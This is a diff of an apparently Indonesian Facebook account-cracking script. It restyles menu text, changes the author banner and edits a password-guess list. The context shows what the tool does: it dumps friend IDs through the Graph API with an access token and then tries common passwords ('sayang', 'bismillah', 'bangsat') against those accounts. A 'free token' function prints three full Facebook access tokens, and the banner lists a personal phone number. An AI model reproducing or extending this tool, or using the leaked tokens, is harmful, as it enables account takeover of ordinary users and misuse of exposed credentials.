@@ -169,8 +169,8 @@ def menu_test():
 def krekefbi():
 	banner()
 	print('[Token>>>> :  '+str(tokenku)) 
-	print('[01]>_Crack ID Public')
-	print('[02]>_Crack ID Public [Massal]')
+	print('[01]>_𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌')
+	print('[02]>_𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒄 [𝑴𝒂𝒔𝒔𝒂𝒍]')
 	print('[03]>_Crack ID Grup')
 	jalan('>_Menu CheckOpsi/Hasil OK CP')
 	print('[04]>_Check Opsi Hasil Checkpoint')
@@ -477,11 +477,11 @@ def dump_publik():
 		token = open('.token.txt','r').read()
 	except IOError:
 		exit()
-	win = '>_Crack ID Public'
+	win = '>_𝑪𝒓𝒂𝒄𝒌 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌'
 	win2 = mark(win, style='cyan')
 	sol().print(win2)
-	print('\033[33m>_Ketik "me" Jika Ingin Dump ID Dari Teman')
-	pil = input('\033[33m>_Masukkan ID Facebook : ')
+	print('\033[33m>_𝑲𝒆𝒕𝒊𝒌 ❞𝒎𝒆❞ 𝑱𝒊𝒌𝒂 𝑰𝒏𝒈𝒊𝒏 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑫𝒂𝒓𝒊 𝑻𝒆𝒎𝒂𝒏')
+	pil = input('\033[33m>_𝑴𝒂𝒔𝒖𝒌𝒂𝒏 𝑰𝑫 𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌 : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v4.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
 		for pi in koh2['friends']['data']:
@@ -490,38 +490,38 @@ def dump_publik():
 		print('\033[33m>_Total : '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		li = '>_Koneksi Internet Bermasalah'
+		li = '>_𝑲𝒐𝒏𝒆𝒌𝒔𝒊 𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑩𝒆𝒓𝒎𝒂𝒔𝒂𝒍𝒂𝒉'
 		lo = mark(li, style='red')
 		sol().print(lo, style='cyan')
 		exit()
 	except (KeyError,IOError):
-		teks = '>_Pertemanan Private Atau Token Rusak'
+		teks = '>_𝑷𝒆𝒓𝒕𝒆𝒎𝒂𝒏𝒂𝒏 𝑷𝒓𝒊𝒗𝒂𝒕𝒆 𝑨𝒕𝒂𝒖 𝑻𝒐𝒌𝒆𝒏 𝑹𝒖𝒔𝒂𝒌'
 		teks2 = mark(teks, style='red')
 		sol().print(teks2)
 		exit()
 
 def dump_massal():
-	win = ' DUMP ID PUBLIK MASSAL'
-	cetak(nel(win, title='DUMP MASSAL'))
-	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
+	win = ' 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑷𝒖𝒃𝒍𝒊𝒌 𝑴𝒂𝒔𝒔𝒂𝒍'
+	cetak(nel(win, title='𝑫𝒖𝒎𝒑 𝑴𝒂𝒔𝒔𝒂𝒍'))
+	print(x+'['+h+'•'+x+'] 𝑴𝒂𝒔𝒖𝒌𝒌𝒂𝒏 𝑱𝒖𝒎𝒍𝒂𝒉 𝑰𝑫 (𝑳𝒊𝒎𝒊𝒕 10)')
 	try:
 		jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
 	except ValueError:
-		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
+		pesan = '# 𝑰𝒏𝒑𝒖𝒕 𝒀𝒂𝒏𝒈 𝑨𝒏𝒅𝒂 𝑴𝒂𝒔𝒖𝒌𝒌𝒂𝒏 𝑩𝒖𝒌𝒂𝒏 𝑨𝒏𝒈𝒌𝒂'
 		pesan2 = mark(pesan, style='red')
 		sol().print(pesan2)
 		exit()
 	if jum<1 or jum>10:
-		pesan = '# OUT OF RANGE MEN'
+		pesan = '# 𝑶𝒖𝒕 𝑶𝒇 𝑹𝒂𝒏𝒈𝒆 𝑴𝒆𝒏'
 		pesan2 = mark(pesan, style='red')
 		sol().print(pesan2)
 		exit()
 	ses=requests.Session()
 	yz = 0
-	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
+	print(x+'['+h+'•'+x+'] 𝑲𝒆𝒕𝒊𝒌 ❞𝒎𝒆❞ 𝑱𝒊𝒌𝒂 𝑰𝒏𝒈𝒊𝒏 𝑫𝒖𝒎𝒑 𝑰𝑫 𝑫𝒂𝒓𝒊 𝑻𝒆𝒎𝒂𝒏')
 	for met in range(jum):
 		yz+=1
-		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
+		kl = input(x+'['+h+str(yz)+x+'] 𝒎𝒂𝒔𝒖𝒌𝒌𝒂𝒏 𝑰𝑫 𝑲𝒆 '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -535,11 +535,11 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+			li = '# 𝑲𝒐𝒏𝒆𝒌𝒔𝒊 𝑰𝒏𝒕𝒆𝒓𝒏𝒆𝒕 𝑩𝒆𝒓𝒎𝒂𝒔𝒂𝒍𝒂𝒉, 𝑷𝒆𝒓𝒊𝒌𝒔𝒂 & 𝑪𝒐𝒃𝒂 𝑳𝒂𝒈𝒊'
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
-	tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
+	tot = '# 𝑩𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝑴𝒆𝒏𝒈𝒖𝒎𝒑𝒖𝒍𝒌𝒂𝒏 %s 𝑰𝑫'%(len(id))
 	if len(id)==0:
 		tot2 = mark(tot, style='red')
 	else:
@@ -603,7 +603,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123']
+			pwv = ['sayang','indonesia','sayang123','bismillah','anjing','katasandi','bangsat']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -1455,12 +1455,12 @@ def kontol():
 \33[37m░╚═══██╗░░░██║░░░██╔══██╗░╚████╔╝░
 \33[37m██████╔╝░░░██║░░░██║░░██║░░╚██╔╝░░
 \33[37m╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░
-\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 \x1b[0;34m█  \33[mGithub: https://github.com/Strv11   
-\x1b[0;34m█  \33[mFacebook: Strovmirviaska            
+\x1b[0;34m█  \33[mFacebook: Teddy Cahyo Putra Pangembara            
 \x1b[0;34m█  \33[mWhatsApp: 082290885204             
-\x1b[0;34m█  \33[mTools : \33[1;96mPremium V7    
-\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
+\x1b[0;34m█  \33[mTools : \33[1;96m Scrip Premium    
+\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
 def janda_sebalah():#line:42
   try :#line:43
     os .system ('clear')
@@ -1658,10 +1658,10 @@ def main():
 def token_gratis():
 	clear()
 	banner()
-	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
+	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
 	print("""%s \33[1;32m SILAHKAN DI AMBIL """%(h))
 	print("""%s \33[1;32m MAKASIH SUDAH MEMAKAI TOLLS SAYA """%(h))
-	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
+	print("""%s ●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬● """%(h))
 	print("""%s \33[1;33m\nEAABsbCS1iHgBAKNJF1ZAMH6SXHFIrwWLpPyoRxsaxbKz7BUb8ozNRZArLtr9WZCe8kPUzwxZB3BRFTzd6BsyKjCXcJQxwSyfelVsfVQkT3fIGuoB8nL3Bhez5sJpkWapEFo1ZBS274aVPoQObFdO0zAb0sIDwfWr6C4XNDlke9nCdrP5ZBL8ZB5 """%(h))
 	print("""%s \33[1;33m\n\nEAABsbCS1iHgBADvC8POMgY7VF14f52GXuKG5rTw5NEQbfnL7fI0oZAeCCv8Q8ohtLDWMtfZBZCrpV80z2DCdrjbhGFhZAYOdmJmbXy5EY2nlMrqXo5ArXnQISyZAUzCBlyMZCDYPyAQ6Icamsw883vadxzoDimX6FsBFwE2ZCiG8wZDZD """%(h))
 	print("""%s \33[1;33m\n\nEAABsbCS1iHgBAHQG0VcFwLEZA5KxI81sWbtffb01NGDfTUIshEZBZAimVJzL9OWmcx6ZCwvNZAep1Xdf0wDTZABFaoisQJnPAmeeCJn5JCy40thXIijNeLwYU0ZBiol5b4JbplZA8quXZAsBeydf6ZBNdE0LEC7sqzyehUtUQeg7WGZBTQMQk0K5PLi """%(h))
